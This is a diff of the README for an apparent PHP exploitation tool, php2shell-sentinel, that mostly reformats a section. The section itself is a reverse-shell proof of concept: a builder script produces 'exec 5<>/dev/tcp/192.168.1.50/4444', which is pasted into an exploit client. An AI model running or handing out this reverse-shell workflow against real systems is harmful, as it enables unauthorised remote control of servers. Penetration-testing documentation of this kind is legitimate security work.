@@ -311,17 +311,28 @@ php2shell-sentinel assess \
 
 > 🔒 Targets **not** in `--allowlist` are skipped automatically.
 
-# 1. Generate the reverse shell command
----bash
+#### Reverse Shell Execution (PoC)
+
+**1. Generate the reverse shell command**
+
+```bash
 python3 reverse_shell_builder.py
+```
+
+```
 Output:... Enter Attacker IP:...
 Output:... Enter Attacker Port: 4444...
 Output: Command to execute via php2shell: exec 5<>/dev/tcp/192.168.1.50/4444;...
+```
 
-# 2. Execute it using the Python client
+**2. Execute it using the Python client**
+
+```bash
 python3 php2shell_exploit_tool.py
-(Inside the tool, paste the command from step 1 into the interactive shell)
----
+```
+
+> *(Inside the tool, paste the command from step 1 into the interactive shell)*
+
 ---
 
 ### 4. `fingerprint` — Deep Fingerprint
